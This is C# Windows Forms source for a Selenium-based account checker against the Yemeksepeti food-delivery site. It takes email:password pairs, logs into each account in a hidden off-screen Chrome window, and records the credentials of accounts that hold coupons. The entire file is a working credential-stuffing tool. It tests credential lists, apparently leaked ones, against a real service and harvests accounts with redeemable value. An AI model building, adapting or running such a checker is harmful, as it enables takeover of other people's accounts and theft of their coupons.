using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System.Threading;
using System.Threading.Tasks;

namespace YemekSepetiKuponKontrol
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        string email = "";
        string sifre = "";
        int kacinci = 1;
        
        private void button1_Click(object sender, EventArgs e)
        {
           
            foreach (var item in richTextBox1.Lines)
            {
                button1.Enabled = false;
                label5.Text = kacinci + "/" + richTextBox1.Lines.Count().ToString();
                ChromeDriverService service = ChromeDriverService.CreateDefaultService();
                service.HideCommandPromptWindow = true;
                var options = new ChromeOptions();
                options.AddArgument("--window-position=-32000,-32000");
                options.AddArgument("--disable-gpu");
                options.AddArgument("--window-size=1920x1080");
                options.AddUserProfilePreference("profile.managed_default_content_settings.images", 2);
                var driver = new ChromeDriver(service, options);
                driver.Navigate().GoToUrl("https://www.yemeksepeti.com/sakarya");
                //IJavaScriptExecutor js = (IJavaScriptExecutor)driver;  YORUM SATIRI OLAN TÜM KISIMLAR HEAD DOSYASINI SİLEN JAVASCRIPT KOMUTLARI UYGULAMAYI BUGA SOKTUGU İCİN KULLANMIYORUM
                //js.ExecuteAsyncScript("(function(){document.head.parentNode.removeChild(document.head);})()");
                IWebElement username = driver.FindElement(By.Id("UserName"));
                IWebElement password = driver.FindElement(By.Id("password"));
                for (int i = 0; i < item.Length; i++)
                {
                    if(item.Substring(i, 1) == ":")
                    {
                        email = item.Substring(0, i);
                        sifre = item.Substring(i+1,item.Length-i-1);
                        break;
                    }
                }           
                username.SendKeys(email);
                password.SendKeys(sifre);
                IWebElement girisbtn = driver.FindElement(By.XPath("/html/body/div[2]/div/div[1]/div/div[1]/div[1]/button"));
                girisbtn.Click();
                //js.ExecuteAsyncScript("(function(){document.head.parentNode.removeChild(document.head);})()");
                for (; ; )
                {
                    try
                    {
                        IWebElement girisTest = driver.FindElement(By.Id("ysUserName"));
                        break;
                    }
                    catch
                    {

                    }
                }              
                try
                {
                    IWebElement kupon = driver.FindElement(By.ClassName("couponCode"));
                    if (Convert.ToInt16(kupon.Text) > 0)
                    {
                        richTextBox2.Text += email + ":" + sifre + " " + kupon.Text + "\n";
                    }
                }
                catch
                {
                }
                driver.Quit();
                
                
               
                kacinci++;
            }
            button1.Enabled = true;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
